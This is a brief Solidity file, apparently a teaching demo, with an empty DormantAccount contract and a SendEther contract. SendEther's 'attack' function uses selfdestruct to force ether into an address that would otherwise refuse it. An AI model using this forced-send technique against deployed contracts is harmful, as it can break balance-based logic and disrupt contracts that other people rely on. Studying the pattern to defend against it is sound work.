// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract DormantAccount {

}

contract SendEther {
    fallback() external payable {}

    function attack(address addr) public payable{
        selfdestruct(payable(addr));
    }
}